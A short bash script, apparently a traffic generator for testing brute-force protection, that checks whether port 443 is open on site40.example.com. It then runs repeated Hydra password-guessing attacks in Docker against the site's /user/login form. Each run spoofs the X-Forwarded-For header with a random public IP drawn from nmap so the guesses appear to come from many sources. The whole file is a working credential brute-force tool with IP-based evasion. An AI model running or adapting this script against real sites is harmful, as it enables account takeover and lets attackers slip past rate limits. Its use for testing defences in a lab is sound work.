#!/bin/bash

sitefqdn[1]="site40.example.com"

# get length of the array
arraylength=${#sitefqdn[@]}

for (( i=1; i<${arraylength}+1; i++ ));
do
         if [ ! -z "${sitefqdn[$i]}" ]; then
        # Only generat traffic on alive VIP
        ip=$(ping -c 1 -w 1 ${sitefqdn[$i]} | grep PING | awk '{ print $3 }')
        timeout 1 bash -c "cat < /dev/null > /dev/tcp/${ip:1:-1}/443"

        if [  $? == 0 ]; then
            # Port 443 open
            port=443
        else
            # If 443 not anwser,stop
            port=0
        fi

        if [[  $port == 443 ]]; then
            echo -e "\n# site $i ${sitefqdn[$i]} brute force attack"

            for i in {1..10}
            do
                    xff=$(nmap -n -iR 1 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,224-255.-.-.- -sL | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*")
                    sudo docker run -t -i asm-brute-force hydra -V -L users10.txt -P pass100.txt ${ip:1:-1} https-form-post "/user/login:username=^USER^&password=^PASS^:S=Account:H=X-forwarded-for: $xff"
            done

        fi
    fi
done
